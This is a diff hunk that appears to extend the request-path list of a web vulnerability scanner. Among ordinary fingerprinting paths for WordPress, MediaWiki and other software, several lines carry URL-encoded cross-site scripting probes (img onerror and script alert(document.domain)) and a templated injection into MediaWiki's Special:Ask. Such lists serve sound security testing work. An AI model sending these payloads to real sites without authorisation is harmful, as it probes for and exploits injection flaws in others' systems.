@@ -230,3 +230,15 @@
 /admin/install.php?install=2&db_type=mysqli&hostname=&db_username={{randstr}}&timezone=UTC&db_table_prefix=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
 /index.php?title=Special:SearchByProperty&property=%253Escript%253Calert(document.domain)%253E/script%253C
 /w/index.php?title=Special:SearchByProperty&property=%253Escript%253Calert(document.domain)%253E/script%253C
+/cucm-uds/version
+/documents
+/auth-status
+/.well-known/acme-challenge/{{verifier_name}}
+/wp-json/wp/v2/pages?search=bookit&per_page=20&order=asc&orderby=date
+/wp-json/wp/v2/posts?search=bookit&per_page=20&order=asc&orderby=date
+/api/healthz
+/?action=genpdf&id=999999
+/rss/tag/%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E?token={{rss_token}}
+/index.php?title=Special:Ask&q=%5B%5BText%3A%3A{{url_encode(payload)}}%5D%5D&debug=1
+/w/index.php?title=Special:Ask&q=%5B%5BText%3A%3A{{url_encode(payload)}}%5D%5D&debug=1
+/wp-json/masterstudy-lms/v2/student-courses?user=1&page=1&pp=10
